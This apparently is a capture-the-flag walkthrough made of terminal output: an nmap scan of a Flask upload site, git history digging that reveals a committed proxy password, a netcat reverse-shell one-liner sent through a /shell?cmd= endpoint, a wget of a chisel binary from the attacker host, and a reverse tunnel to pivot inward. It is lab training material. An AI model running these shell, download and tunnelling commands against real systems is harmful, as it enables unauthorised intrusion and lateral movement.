```console
└─$ nmap -A -p- -T4 -Pn 10.129.59.80
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 11:39 CDT
Nmap scan report for 10.129.59.80
Host is up (0.030s latency).
Not shown: 65296 closed tcp ports (conn-refused), 237 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Wed, 28 Sep 2022 16:39:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Wed, 28 Sep 2022 16:39:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=9/28%Time=633478D3%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Wed,\x2028\x20Sep\x202022\x2016:39:48\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Wed,\x2028\
SF:x20Sep\x202022\x2016:39:48\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.36 seconds
```

```console
└─$ git log                                                 
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
                                                                                                 
└─$ git branch    
  dev
* public
                                                                                                 
└─$ git log public
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
                                                                                                 
└─$ git log dev   
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
                                                                                                 
└─$ git cat-file a76f8f75f7a4a12b706b0cf9c983796fa1985820 -p
tree e57842ccd63e316712011d87445a9022e83576e9
parent ee9d9f1ef9156c787d53074493e39ae364cd1e05
author gituser <gituser@local> 1651146376 +0200
committer gituser <gituser@local> 1651146376 +0200

updated
                                                                                                 
└─$ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820       
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
diff --git a/app/app/views.py b/app/app/views.py
index f2744c6..0f3cc37 100644
--- a/app/app/views.py
+++ b/app/app/views.py
@@ -6,7 +6,17 @@ from flask import render_template, request, send_file
 from app import app
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/download')
+def download():
+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
+
+
+@app.route('/upcloud', methods=['GET', 'POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -20,4 +30,4 @@ def upload_file():
 @app.route('/uploads/<path:path>')
 def send_report(path):
     path = get_file_name(path)
-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\ No newline at end of file
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
              
```

```console
└─$ curl 'http://10.129.59.80/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.16.10%201234%20>/tmp/f'
```


```console
└─$ nc -lvnp 1234         
listening on [any] 1234 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.59.80] 44869
/bin/sh: can't access tty; job control turned off
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/app # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:04  
          inet addr:172.17.0.4  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1581526 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1378463 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:129138727 (123.1 MiB)  TX bytes:702526213 (669.9 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

/app # 
```

```console
/tmp # wget http://10.10.16.10:8000/chisel2
Connecting to 10.10.16.10:8000 (10.10.16.10:8000)
saving to 'chisel2'
chisel2                0% |                                | 37044  0:03:38 ETA
chisel2               13% |****                            | 1036k  0:00:13 ETA
chisel2               70% |**********************          | 5543k  0:00:01 ETA
chisel2              100% |********************************| 7888k  0:00:00 ETA
'chisel2' saved
/tmp # chmod 777 chisel2
/tmp # ./chisel2 client 10.10.16.10:1235 R:3000:172.17.0.4:3000
2022/09/28 17:45:59 client: Connecting to ws://10.10.16.10:1235
2022/09/28 17:46:00 client: Connected (Latency 30.852349ms)
```


```console
└─$ chisel server --reverse --port 1235
2022/09/28 12:34:38 server: Reverse tunnelling enabled
2022/09/28 12:34:38 server: Fingerprint aIrjqcFNJGoCQA0Rl/A8Dl271nI2BLhRTESYFhCErYA=
2022/09/28 12:34:38 server: Listening on http://0.0.0.0:1235
2022/09/28 12:45:59 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/09/28 12:45:59 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
```
![image](https://user-images.githubusercontent.com/105310322/192855531-f9c67260-c0e6-49b5-ba14-2fd2b1bbc01f.png)
